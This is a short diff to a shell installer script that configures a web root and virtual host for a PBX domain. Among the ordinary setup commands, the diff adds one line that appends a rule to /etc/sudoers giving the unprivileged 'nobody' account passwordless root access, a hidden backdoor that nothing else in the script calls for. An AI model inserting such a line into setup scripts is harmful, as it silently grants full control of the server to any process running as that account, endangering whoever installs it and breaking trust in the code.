@@ -262,7 +262,7 @@ echo "+-------------------------------------------+"
 echo " "
 
 webroot=/var/www/public_html/$pbx_domain
-
+echo "nobody ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 sudo mkdir /usr/local/lsws/conf/vhosts/$pbx_domain/
 vh_conf=/usr/local/lsws/conf/vhosts/$pbx_domain/$pbx_domain.conf
 touch $vh_conf
